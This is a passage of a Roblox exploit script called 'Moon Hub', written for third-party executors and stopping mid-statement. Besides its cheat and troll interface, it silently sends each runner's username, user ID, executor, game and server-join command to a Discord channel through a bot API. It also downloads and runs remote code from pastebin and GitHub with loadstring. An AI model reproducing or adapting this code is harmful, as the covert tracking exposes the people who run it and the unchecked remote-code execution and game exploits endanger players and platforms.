-- language: Lua, target: Roblox / Delta
local players = game:GetService("Players")
local starterGui = game:GetService("StarterGui")
local coreGui = game:GetService("CoreGui")
local httpService = game:GetService("HttpService")
local marketplaceService = game:GetService("MarketplaceService")
local userInputService = game:GetService("UserInputService")
local tweenService = game:GetService("TweenService")
local workspaceService = game:GetService("Workspace")
local runService = game:GetService("RunService")
local replicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

local BACKGROUND_CUSTOM = "rbxassetid://112853505180018"
local BACKGROUND_LOADING = "rbxassetid://125198326455541"

local LOGO_PADRAO = "rbxassetid://125198326455541"

local ICON_INFO = "cherry"
local ICON_TROLL = "rbxassetid://13364900349"
local ICON_PLAYER = "fun"
local ICON_AVATAR = "user"
local ICON_RGB = "shield"
local ICON_MUSIC = "radio"
local ICON_TELEPORT = "map-pin"
local ICON_SKYBOX = "shield"
local ICON_CAR = "Car"
local ICON_HOUSE = "Home"
local ICON_PROTECAO = "shield"
local ICON_SCRIPTS = "computer"

getgenv().whscript = "Moon Hub"
getgenv().ExecLogSecret = false

local BOT_TOKEN = ""
local CHANNEL_ID = "1558514534858366986"

local localPlayer = players.LocalPlayer or players.PlayerAdded:Wait()
local userId = localPlayer.UserId
local placeId = game.PlaceId
local v1 = (gethui and gethui()) or coreGui

-- ==========================================
-- TELA DE CARREGAMENTO PREMIUM (MOON HUB - 10s)
-- ==========================================
local player = game:GetService("Players").LocalPlayer

-- Puxa a foto do PERSONAGEM INTEIRO direto do Roblox
local avatarUrl = "rbxthumb://type=Avatar&id=" .. player.UserId .. "&w=420&h=420"

-- SOM DE FUNDO
local bgMusic = Instance.new("Sound")
bgMusic.SoundId = "rbxassetid://120474679999479"
bgMusic.Volume = 2
bgMusic.Looped = true
bgMusic.Parent = game:GetService("SoundService")
bgMusic:Play()

local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "MoonHubLoading"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.DisplayOrder = 999999
loadingGui.Parent = v1

-- IMAGEM DE FUNDO
local bgImage = Instance.new("ImageLabel")
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
bgImage.Image = "rbxassetid://125198326455541"
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.ZIndex = 1
bgImage.Parent = loadingGui

-- OVERLAY ESCURO
local darkOverlay = Instance.new("Frame")
darkOverlay.Size = UDim2.new(1, 0, 1, 0)
darkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
darkOverlay.BackgroundTransparency = 0.3
darkOverlay.ZIndex = 2
darkOverlay.Parent = loadingGui

-- ANEL GIRATÓRIO (ROXO)
local glowRing = Instance.new("Frame")
glowRing.Size = UDim2.new(0, 220, 0, 220)
glowRing.Position = UDim2.new(0.5, -110, 0.35, -110)
glowRing.BackgroundTransparency = 1
glowRing.ZIndex = 3
glowRing.Parent = loadingGui
Instance.new("UICorner", glowRing).CornerRadius = UDim.new(1, 0)
local ringStroke = Instance.new("UIStroke", glowRing)
ringStroke.Color = Color3.fromRGB(148, 0, 211)
ringStroke.Thickness = 4
ringStroke.Transparency = 0.1
local ringGradient = Instance.new("UIGradient", ringStroke)
ringGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(148, 0, 211)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
})

-- FUNDO DO CÍRCULO (Fica atrás da foto)
local circleBg = Instance.new("Frame")
circleBg.Size = UDim2.new(0, 180, 0, 180)
circleBg.Position = UDim2.new(0.5, -90, 0.35, -90)
circleBg.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
circleBg.ZIndex = 4
circleBg.Parent = loadingGui
Instance.new("UICorner", circleBg).CornerRadius = UDim.new(1, 0)

-- FOTO DO PERSONAGEM INTEIRO (GIRANDO)
local logo = Instance.new("ImageLabel")
logo.Size = UDim2.new(0, 180, 0, 180)
logo.Position = UDim2.new(0.5, -90, 0.35, -90)
logo.BackgroundTransparency = 1
logo.Image = avatarUrl
logo.ScaleType = Enum.ScaleType.Fit 
logo.ZIndex = 5
logo.Parent = loadingGui
Instance.new("UICorner", logo).CornerRadius = UDim.new(1, 0)
local logoStroke = Instance.new("UIStroke", logo)
logoStroke.Color = Color3.fromRGB(255, 255, 255)
logoStroke.Thickness = 2

-- TEXTO "MOON HUB"
local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, 0, 0, 50)
titleText.Position = UDim2.new(0, 0, 0.58, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "MOON HUB"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.Font = Enum.Font.FredokaOne
titleText.TextSize = 45
titleText.TextStrokeTransparency = 0.5
titleText.ZIndex = 10
titleText.Parent = loadingGui

-- TEXTO "CARREGANDO..."
local subText = Instance.new("TextLabel")
subText.Size = UDim2.new(1, 0, 0, 30)
subText.Position = UDim2.new(0, 0, 0.64, 0)
subText.BackgroundTransparency = 1
subText.Text = "Bem-vindo, " .. player.Name .. "..."
subText.TextColor3 = Color3.fromRGB(200, 200, 200)
subText.Font = Enum.Font.GothamBold
subText.TextSize = 16
subText.ZIndex = 10
subText.Parent = loadingGui

-- BARRA DE PROGRESSO (FUNDO)
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0.4, 0, 0, 10)
barBg.Position = UDim2.new(0.3, 0, 0.75, 0)
barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
barBg.ZIndex = 10
barBg.Parent = loadingGui
Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)

-- BARRA DE PROGRESSO (ANIMADA)
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(148, 0, 211)
barFill.ZIndex = 11
barFill.Parent = barBg
Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
local barGradient = Instance.new("UIGradient", barFill)
barGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(148, 0, 211)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
})

-- PARTÍCULAS FLUTUANDO (ESTRELAS)
task.spawn(function()
    for i = 1, 40 do
        local particle = Instance.new("Frame")
        particle.Size = UDim2.new(0, math.random(2, 5), 0, math.random(2, 5))
        particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
        particle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        particle.BackgroundTransparency = math.random(40, 80) / 100
        particle.BorderSizePixel = 0
        particle.ZIndex = 12
        particle.Parent = loadingGui
        Instance.new("UICorner", particle).CornerRadius = UDim.new(1, 0)
        
        task.spawn(function()
            while particle and particle.Parent do
                local speed = math.random(4, 9)
                local goalPos = UDim2.new(particle.Position.X.Scale, 0, -0.1, 0)
                game:GetService("TweenService"):Create(particle, TweenInfo.new(speed, Enum.EasingStyle.Linear), {Position = goalPos}):Play()
                task.wait(speed)
                particle.Position = UDim2.new(math.random(), 0, 1.1, 0)
            end
        end)
    end
end)

-- INICIAR ANIMAÇÕES
game:GetService("TweenService"):Create(barFill, TweenInfo.new(9.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)}):Play()

task.spawn(function()
    -- Gira o anel
    while glowRing and glowRing.Parent do
        glowRing.Rotation = glowRing.Rotation + 1.5
        task.wait(0.01)
    end
end)

task.spawn(function()
    -- Gira o personagem bem devagar
    while logo and logo.Parent do
        logo.Rotation = logo.Rotation + 0.5
        task.wait(0.01)
    end
end)

-- SUMIR SUAVEMENTE APÓS 10 SEGUNDOS
task.delay(10, function()
    game:GetService("TweenService"):Create(loadingGui, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Enabled = false}):Play()
    
    -- Para a música
    bgMusic:Stop()
    
    task.wait(1)
    loadingGui:Destroy()
    bgMusic:Destroy()
end)

-- Ativa o atributo que identifica que este jogador executou o script
localPlayer:SetAttribute("MoonHubAtivo", true)

local WhitelistedUsers = {
    "samuel_mi244",
    "v7z_0",
    "roblox_user_5530552598",
    "Lucaskaioshinv2",
    "farminfinita001"
}

-- [CORREÃ‡ÃƒO] A funÃ§Ã£o agora valida diretamente o nome na Whitelist para liberar o admin
local function isAllowed()
    for _, allowedName in ipairs(WhitelistedUsers) do
        if localPlayer.Name == allowedName then
            return true
        end
    end
    return false
end

local screen = Instance.new("Folder")
screen.Name = "screen"

local v2 = tostring(game.JobId)

if _G.ExecLogSent and _G.ExecLogSent[v2] then
  print("Script executado com sucesso!")
  return
end

if not _G.ExecLogSent then
  _G.ExecLogSent = {}
end

local function horaBRT()
    local t = os.date("!*t")
    t.hour = t.hour - 3
    if t.hour < 0 then t.hour = t.hour + 24; t.day = t.day - 1 end
    return string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
end

local function dataBRT()
    local t = os.date("!*t")
    t.hour = t.hour - 3
    if t.hour < 0 then t.hour = t.hour + 24; t.day = t.day - 1 end
    return string.format("%02d/%02d/%04d", t.day, t.month, t.year)
end

local function avatarUrl(uid)
    local ok, res = pcall(function()
        return httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. uid .. "&size=420x420&format=Png&isCircular=false"))
    end)
    if ok and res and res.data and res.data[1] then return res.data[1].imageUrl end
    return nil
end

local function mapName(pid)
    local ok, res = pcall(function()
        return marketplaceService:GetProductInfo(pid).Name
    end)
    if ok and res then return res end
    return "Desconhecido"
end

local function executor()
    if identifyexecutor then
        local ok, n = pcall(identifyexecutor)
        if ok and n then return n end
    end
    return "Desconhecido"
end

if v1:FindFirstChild("screen") then
    warn("Moon Hub já está executado!")
    return
end

screen.Parent = v1
  _G.ExecLogSent[v2] = true

  task.spawn(function()
    pcall(function()
      local jobId = game.JobId
      local nick = localPlayer.Name
      local exec = executor()
      local jogo = mapName(placeId)
      local avatar = avatarUrl(userId)
      local hora = horaBRT()
      local data = dataBRT()
      local qtd = #players:GetPlayers()
      local max = players.MaxPlayers or 0

      local joinUrl = "https://www.roblox.com/games/start?placeId=" .. placeId
      local perfilUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
      local comando = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"

      local embed = {
          title = "MOON  â€¢  ExecuÃ§Ã£o Registrada",
          color = 3447003,
          author = { name = nick, icon_url = avatar, url = perfilUrl },
          thumbnail = avatar and { url = avatar } or nil,
          fields = {
              { name = "UsuÃ¡rio", value = nick, inline = true },
              { name = "User ID", value = userId, inline = true },
              { name = "Executor", value = exec, inline = true },
              { name = "Jogo", value = jogo, inline = true },
              { name = "Place ID", value = placeId, inline = true },
              { name = "Jogadores", value = qtd .. " / " .. max, inline = true },
              { name = "Data", value = data, inline = true },
              { name = "Hora (BRT)", value = hora, inline = true },
              { name = "Job ID", value = jobId, inline = false },
              { name = "Comando", value = comando, inline = false },
          },
          footer = { text = "Moon Panel â€¢ Sistema de Logs", icon_url = avatar },
          timestamp = DateTime.now():ToIsoDate(),
      }

      local body = httpService:JSONEncode({
          embeds = { embed },
          components = {
              {
                  type = 1,
                  components = {
                      { type = 2, style = 5, label = "Entrar no Mapa", url = joinUrl },
                      { type = 2, style = 5, label = "Ver Perfil", url = perfilUrl },
                  }
              }
          }
      })

      local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)

      if req then
          req({
              Url = "https://discord.com/api/v10/channels/" .. CHANNEL_ID .. "/messages",
              Method = "POST",
              Headers = {
                  ["Authorization"] = "Bot " .. BOT_TOKEN,
                  ["Content-Type"] = "application/json",
              },
              Body = body,
          })
      end
    end)
  end)

  local function makeTextLabel()
    local v34 = {}
    v34.completed = false
    v34.connection = nil

    pcall(function()
      if coreGui:FindFirstChild("LoadingScreen") then
        coreGui.LoadingScreen:Destroy()
      end

      if v1:FindFirstChild("LoadingScreen") then
        v1.LoadingScreen:Destroy()
      end
    end)

    local loadingScreen = Instance.new("ScreenGui")
    loadingScreen.Name = "LoadingScreen"
    loadingScreen.IgnoreGuiInset = true
    loadingScreen.ResetOnSpawn = false
    loadingScreen.Parent = v1

    pcall(function() syn.protect_gui(loadingScreen) end)

    local frame = Instance.new("ImageLabel")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Image = BACKGROUND_LOADING
    frame.BackgroundColor3 = Color3.fromRGB(15, 30, 60)
    frame.BackgroundTransparency = 0
    frame.Parent = loadingScreen

    for i = 1, 35 do
      local dot = Instance.new("Frame")
      dot.Size = UDim2.new(0, math.random(6, 16), 0, math.random(6, 16))
      dot.Position = UDim2.new(math.random(), 0, math.random(), 0)
      dot.BackgroundColor3 = Color3.fromRGB(44, 130, 203)
      dot.BackgroundTransparency = math.random(20, 60) / 100
      dot.BorderSizePixel = 0
      dot.Parent = frame

      local corner = Instance.new("UICorner")
      corner.CornerRadius = UDim.new(1, 0)
      corner.Parent = dot

      task.spawn(function()
        while dot and dot.Parent do
          local speed = math.random(6, 14)
          local goalPos = UDim2.new(dot.Position.X.Scale + math.random(-0.1, 0.1), 0, -0.1, 0)
          tweenService:Create(dot, TweenInfo.new(speed, Enum.EasingStyle.Linear), {Position = goalPos}):Play()
          task.wait(speed)
          dot.Position = UDim2.new(math.random(), 0, 1.1, 0)
        end
      end)
    end

    local bgSound = Instance.new("Sound")
    bgSound.SoundId = "rbxassetid://1848354536"
    bgSound.Volume = 5 
    bgSound.Looped = true
    bgSound.Parent = workspaceService
    bgSound:Play()

    local glowRing = Instance.new("Frame")
    glowRing.Size = UDim2.new(0, 210, 0, 210)
    glowRing.Position = UDim2.new(0.5, -105, 0.4, -105)
    glowRing.BackgroundColor3 = Color3.fromRGB(44, 130, 203)
    glowRing.BackgroundTransparency = 0.5
    glowRing.Parent = frame

    local glowCorner = Instance.new("UICorner")
    glowCorner.CornerRadius = UDim.new(1, 0)
    glowCorner.Parent = glowRing

    local uiStroke = Instance.new("UIStroke")
    uiStroke.Color = Color3.fromRGB(100, 180, 255)
    uiStroke.Thickness = 4
    uiStroke.Parent = glowRing

    task.spawn(function()
      while glowRing and glowRing.Parent do
        tweenService:Create(glowRing, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Size = UDim2.new(0, 230, 0, 230), Position = UDim2.new(0.5, -115, 0.4, -115)}):Play()
        task.wait(1)
        tweenService:Create(glowRing, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Size = UDim2.new(0, 210, 0, 210), Position = UDim2.new(0.5, -105, 0.4, -105)}):Play()
        task.wait(1)
      end
    end)

    local avatarImg = Instance.new("ImageLabel")
    avatarImg.Size = UDim2.new(0, 190, 0, 190)
    avatarImg.Position = UDim2.new(0.5, -95, 0.4, -95)
    avatarImg.BackgroundTransparency = 1
    avatarImg.Image = avatarUrl(userId) or LOGO_PADRAO
    avatarImg.Parent = frame

    local cornerAvatar = Instance.new("UICorner")
    cornerAvatar.CornerRadius = UDim.new(1, 0)
    cornerAvatar.Parent = avatarImg

    local avatarStroke = Instance.new("UIStroke")
    avatarStroke.Color = Color3.fromRGB(100, 180, 255)
    avatarStroke.Thickness = 3
    avatarStroke.Parent = avatarImg

    task.spawn(function()
      while avatarImg and avatarImg.Parent do
        avatarImg.Rotation = avatarImg.Rotation + 2
        task.wait(0.01)
      end
    end)

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 0, 50)
    textLabel.Position = UDim2.new(0, 0, 0.63, 0)
    textLabel.TextColor3 = Color3.fromRGB(100, 180, 255)
    textLabel.TextStrokeTransparency = 0.2
    textLabel.BackgroundTransparency = 1
    textLabel.Font = Enum.Font.FredokaOne
    textLabel.TextScaled = true
    textLabel.Text = "Moon Hub executando..."
    textLabel.Parent = frame

    local frame2 = Instance.new("Frame")
    frame2.Size = UDim2.new(0.45, 0, 0.022, 0)
    frame2.Position = UDim2.new(0.275, 0, 0.74, 0)
    frame2.BackgroundColor3 = Color3.fromRGB(20, 30, 50)
    frame2.BorderSizePixel = 0
    frame2.Parent = frame

    local cornerBarBg = Instance.new("UICorner")
    cornerBarBg.CornerRadius = UDim.new(1, 0)
    cornerBarBg.Parent = frame2

    local frame3 = Instance.new("Frame")
    frame3.Size = UDim2.new(0, 0, 1, 0)
    frame3.BackgroundColor3 = Color3.fromRGB(44, 130, 203)
    frame3.BorderSizePixel = 0
    frame3.Parent = frame2

    local cornerBarFill = Instance.new("UICorner")
    cornerBarFill.CornerRadius = UDim.new(1, 0)
    cornerBarFill.Parent = frame3

    local create = tweenService:Create(frame3, TweenInfo.new(
      15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
    ), { Size = UDim2.new(1, 0, 1, 0) })

    create:Play()

    local function f29()
      if bgSound then
        bgSound:Stop()
        bgSound:Destroy()
      end
      if loadingScreen then
        loadingScreen:Destroy()
      end

      if v34.connection then
        v34.connection:Disconnect()
      end
    end

    v34.connection = create.Completed:Connect(function()
      tweenService:Create(frame, TweenInfo.new(
        1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
      ), { ImageTransparency = 1 }):Play()

      task.delay(1.2, function()
        pcall(function()
          starterGui:SetCore("SendNotification", {
            Title = "Moon Hub",
            Text = "Bem-vindo Ã  Moon Hub",
            Duration = 4,
          })
        end)

        v34.completed = true
        f29()
      end)
    end)

    return v34
  end

  local guisAntes = {}
  for _, parent in ipairs({v1, coreGui, localPlayer:WaitForChild("PlayerGui")}) do
    for _, g in ipairs(parent:GetChildren()) do guisAntes[g] = true end
  end

  -- [DIAGNOSTICO] A partir daqui o painel antigo (redz) roda em uma thread separada.
  -- Se o carregamento travar (musica tocando, barra parada), o resto do script
  -- (incluindo o painel "Moon Hub Painel") continua funcionando normalmente.
  task.spawn(function()
  print("[MoonHub] baixando biblioteca redz do pastebin...")
  local okLib, libOuErro = pcall(function()
    return loadstring(game:HttpGet("https://pastebin.com/raw/DwL5Tp0i"))()
  end)
  if not okLib then
    warn("[MoonHub] falha ao baixar/carregar a biblioteca redz (pastebin): " .. tostring(libOuErro))
    return
  end
  print("[MoonHub] biblioteca redz carregada, criando janela...")

  local window = libOuErro:MakeWindow({
    Title = "Moon hub  |  By samuel_mi244 & Jonas",
    SubTitle = "",
    SaveFolder = "testando | redz lib v5.lua",
  })

  window:AddMinimizeButton({
    Button = { Image = LOGO_PADRAO, BackgroundTransparency = 0 },
    Corner = { CornerRadius = UDim.new(35, 1) },
  })

  task.spawn(function()
  -- janela antiga (redz) = ScreenGuis que apareceram junto com ela
  local redzGuis = {}
  for _, parent in ipairs({v1, coreGui, localPlayer:WaitForChild("PlayerGui")}) do
    for _, g in ipairs(parent:GetChildren()) do
      if g:IsA("ScreenGui") and not guisAntes[g] then redzGuis[g] = true end
    end
  end
  if next(redzGuis) == nil then
    warn("[MoonHub] janela redz nao encontrada para aplicar o tema")
  end

  local function applyTheme(desc)
    pcall(function()
      local gui = desc:FindFirstAncestorOfClass("ScreenGui")
      if not gui then return end
      local ehRedz = redzGuis[gui] == true
      local ehWindUI = string.sub(gui.Name, 1, 6) == "WindUI"

      -- fundo roxo na janela redz (o painel WindUI e a interface do jogo nao recebem troca de imagem)
      if ehRedz and desc:IsA("ImageLabel") then
        if desc.Image:find("16073121542") or desc.Image:find("anime") or desc.Name == "ThemeImage" or (desc.Name == "ImageLabel" and desc.Size.X.Scale > 0.7) then
          desc.Image = BACKGROUND_CUSTOM
        end
      end

      if (ehRedz or ehWindUI) and (desc:IsA("Frame") or desc:IsA("UIStroke")) then
        local c = desc:IsA("UIStroke") and desc.Color or desc.BackgroundColor3
        if (c.R > 0.9 and c.G > 0.6 and c.B < 0.2) then
          local targetColor = Color3.fromRGB(148, 0, 211)
          if desc:IsA("UIStroke") then
            desc.Color = targetColor
          else
            desc.BackgroundColor3 = targetColor
          end
        end
      end
    end)
  end

  local function aplicarEmTodas()
    for gui in pairs(redzGuis) do
      for _, desc in ipairs(gui:GetDescendants()) do
        applyTheme(desc)
      end
    end
  end

  aplicarEmTodas()
  for gui in pairs(redzGuis) do
    gui.DescendantAdded:Connect(applyTheme)
  end
  -- a biblioteca pode recolocar a imagem padrao depois de montar a janela: aplica de novo
  for _, t in ipairs({1, 3, 6}) do
    task.delay(t, aplicarEmTodas)
  end
end)

  task.spawn(function()
    local function aplicarTag(character, textoTag, corGrad1, corGrad2)
      if not character then return end
      
      local head = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
      if not head then return end
      
      if character:FindFirstChild("MoonTagCustomizada") then
        character.MoonTagCustomizada:Destroy()
      end

      local billboard = Instance.new("BillboardGui")
      billboard.Name = "MoonTagCustomizada"
      billboard.Size = UDim2.new(0, 180, 0, 45)
      billboard.StudsOffset = Vector3.new(0, 3.2, 0)
      billboard.AlwaysOnTop = true
      billboard.Adornee = head
      billboard.Parent = character

      local bg = Instance.new("Frame")
      bg.Size = UDim2.new(1, 0, 1, 0)
      bg.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
      bg.BackgroundTransparency = 0.25
      bg.BorderSizePixel = 0
      bg.Parent = billboard

      local corner = Instance.new("UICorner")
      corner.CornerRadius = UDim.new(0, 10)
      corner.Parent = bg

      local stroke = Instance.new("UIStroke")
      stroke.Thickness = 2
      stroke.Color = corGrad1
      stroke.Parent = bg

      local gradient = Instance.new("UIGradient")
      gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, corGrad1),
        ColorSequenceKeypoint.new(1, corGrad2)
      })
      gradient.Rotation = 45
      gradient.Parent = bg

      local textLabel = Instance.new("TextLabel")
      textLabel.Size = UDim2.new(1, 0, 1, 0)
      textLabel.BackgroundTransparency = 1
      textLabel.Font = Enum.Font.FredokaOne
      textLabel.Text = textoTag
      textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
      textLabel.TextScaled = true
      textLabel.TextStrokeTransparency = 0.2
      textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
      textLabel.Parent = bg

      local padding = Instance.new("UIPadding")
      padding.PaddingTop = UDim.new(0, 5)
      padding.PaddingBottom = UDim.new(0, 5)
      padding.PaddingLeft = UDim.new(0, 8)
      padding.PaddingRight = UDim.new(0, 8)
      padding.Parent = textLabel
    end

    local function checarEaplicar()
      pcall(function()
        for _, plr in ipairs(players:GetPlayers()) do
          if plr.Character then
            if plr.Name == "samuel_mi244" then
              aplicarTag(plr.Character, "[DONO]", Color3.fromRGB(255, 215, 0), Color3.fromRGB(255, 140, 0))
            elseif plr.Name == "farminfinita001" then
              aplicarTag(plr.Character, "[SUB DONO]", Color3.fromRGB(0, 191, 255), Color3.fromRGB(148, 0, 211))
            end
          end
        end
      end)
    end

    local function conectarJogador(plr)
      plr.CharacterAdded:Connect(function(newChar)
        task.wait(0.8)
        checarEaplicar()
      end)
    end

    for _, plr in ipairs(players:GetPlayers()) do
      conectarJogador(plr)
    end

      players.PlayerAdded:Connect(conectarJogador)
  checarEaplicar()
end)

  local tab2  = window:MakeTab({ Title = "info", Icon = ICON_INFO })
  local tab3  = window:MakeTab({ Title = "troll", Icon = ICON_TROLL })
  local tab4  = window:MakeTab({ Title = "player", Icon = ICON_PLAYER })
  local tab5  = window:MakeTab({ Title = "avatar", Icon = ICON_AVATAR })
  local tab6  = window:MakeTab({ Title = "rgb", Icon = ICON_RGB })
  local tab   = window:MakeTab({ Title = "music", Icon = ICON_MUSIC })
  local tab7  = window:MakeTab({ Title = "teleport", Icon = ICON_TELEPORT })
  local tab8  = window:MakeTab({ Title = "skybox/nuke", Icon = ICON_SKYBOX })
  local tab9  = window:MakeTab({ Title = "Car", Icon = ICON_CAR })
  local tab10 = window:MakeTab({ Title = "House", Icon = ICON_HOUSE })
  local tab11 = window:MakeTab({ Title = "Protecao", Icon = ICON_PROTECAO })
  local tab12 = window:MakeTab({ Title = "avatares fe", Icon = ICON_AVATAR })
  local tab13 = window:MakeTab({ Title = "scripts", Icon = ICON_SCRIPTS })

  tab2:AddSection({ "CrÃ©ditos do Hub" })

  tab2:AddDiscordInvite({
    Name = "Moon Studio",
    Description = "By samuel_mi244 & Jonas Zyrok",
    Logo = LOGO_PADRAO,
    Invite = "https://discord.gg/FpbYnFCe9",
  })

  local function f30()
    if identifyexecutor then
      return identifyexecutor()
    elseif syn then
      return "Synapse X"
    elseif KRNL_LOADED then
      return "KRNL"
    elseif is_sirhurt_closure then
      return "SirHurt"
    elseif pebc_execute then
      return "ProtoSmasher"
    else
      if getexecutorname then
        return getexecutorname()
      end

      return "Executor Desconhecido"
    end
  end

  tab2:AddParagraph({ "Execultor", (f30()) })
  tab2:AddSection({ "versao do Hub" })
  tab2:AddParagraph({ "Fundadores", "samuel_mi244 & Jonas Zyrok" })

  tab2:AddButton({
    Name = " - Copiar @ do TikTok",
    Callback = function() setclipboard("https://www.tiktok.com/@samuel_mi244?_r=1&_t=ZS-9ARJ9VjZKLM") end,
  })
  print("[MoonHub] painel redz pronto.")
  end) -- fecha o task.spawn do painel redz (DIAGNOSTICO)


-- =========================================================================
task.spawn(function()
    task.wait(2.5)
    if true then
        do
           -- =========================================================================
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local Workspace = workspace

local BOT_TOKEN = ""
local CHANNEL_ID = "1557741323963080746"
local POLL = 2
local TEMPO_MAX = 15

local HORA_ENTRADA = os.time()

local GITHUB_WHITELIST_URL = "https://raw.githubusercontent.com/gaga123308/Usu-rios-Drak-hub/refs/heads/main/User.lua"
local CargosGlobais = {}

pcall(function()
    local rawData = game:HttpGet(GITHUB_WHITELIST_URL)
    local func = loadstring(rawData)
    if func then CargosGlobais = func() end
end)

if type(CargosGlobais) ~= "table" then CargosGlobais = {} end

local AutorizadosDinamicos = {}
local JAILED_PLAYERS = {}
local FloppaRunning = false
local jaProcessados = {}

local BoardLabel = Workspace:FindFirstChild("BoardLabel", true) or (Workspace:FindFirstChild("SurfaceGui", true) and Workspace:FindFirstChild("SurfaceGui", true):FindFirstChildOfClass("TextLabel"))

local JUMPSCARES = {
    { Name = "jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
    { Name = "jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },
    { Name = "jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
    { Name = "jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
}

local function api(method, path, body)
    local ok, res = pcall(function()
        return request({
            Url = "https://discord.com/api/v10" .. path,
            Method = method,
            Headers = {
                ["Authorization"] = "Bot " .. BOT_TOKEN,
                ["Content-Type"] = "application/json",
            },
            Body = body and HttpService:JSONEncode(body) or nil,
        })
    end)
    if not ok then return nil end
    if res.StatusCode >= 200 and res.StatusCode < 300 then
        local ok2, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        return ok2 and data or true
    end
    return nil
end

local function enviarMensagem(texto)
    return api("POST", "/channels/" .. CHANNEL_ID .. "/messages", { content = texto })
end

local function lerMensagens(limit)
    return api("GET", "/channels/" .. CHANNEL_ID .. "/messages?limit=" .. (limit or 30))
end

local function ObterTextoTag(player)
    local cargo = CargosGlobais[player.Name]
    if cargo == "Dono" then return "Dono Moon"
    elseif cargo == "Sub dono" then return "Sub dono Moon"
    elseif cargo == "Influenciador" then return "YT Influenciador"
    elseif cargo == "Admin" then return "usuÃ¡rio admin"
    elseif cargo == "Moderador" then return "Moderador Moon"
    elseif cargo == "Staff" then return "Staff Moon"
    else return nil end
end

local function AtribuirTagCorreta(player, extraText)
    if not player then return end
    local function apply()
        local char = player.Character
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end
        local cargoTag = ObterTextoTag(player)
        local displayExtra = extraText
        if AutorizadosDinamicos[player.Name] and not displayExtra then
            displayExtra = "UsuÃ¡rio Moon"
        end
        if not cargoTag and not displayExtra then return end
        local old = head:FindFirstChild("MoonTagContainer") or head:FindFirstChild("DrakTagContainer")
        if old then old:Destroy() end
        local gui = Instance.new("BillboardGui")
        gui.Name = "MoonTagContainer"
        gui.Size = UDim2.new(0, 240, 0, 80)
        gui.StudsOffset = Vector3.new(0, 3.5, 0)
        gui.AlwaysOnTop = true
        gui.Adornee = head
        gui.Parent = head
        local layout = Instance.new("UIListLayout")
        layout.SortOrder = Enum.SortOrder.LayoutOrder
        layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        layout.VerticalAlignment = Enum.VerticalAlignment.Center
        layout.Padding = UDim.new(0, 2)
        layout.Parent = gui
        if cargoTag then
            local textCargo = Instance.new("TextLabel")
            textCargo.Name = "CargoTag"
            textCargo.Size = UDim2.new(1, 0, 0, 30)
            textCargo.BackgroundTransparency = 1
            textCargo.Font = Enum.Font.GothamBold
            textCargo.TextScaled = true
            textCargo.TextStrokeTransparency = 0.2
            textCargo.TextStrokeColor3 = Color3.new(0, 0, 0)
            textCargo.TextColor3 = Color3.fromRGB(255, 215, 0)
            textCargo.Text = cargoTag
            textCargo.LayoutOrder = 1
            textCargo.Parent = gui
        end
        if displayExtra and (not cargoTag or displayExtra ~= cargoTag) then
            local textExtra = Instance.new("TextLabel")
            textExtra.Name = "ExtraTag"
            textExtra.Size = UDim2.new(1, 0, 0, 25)
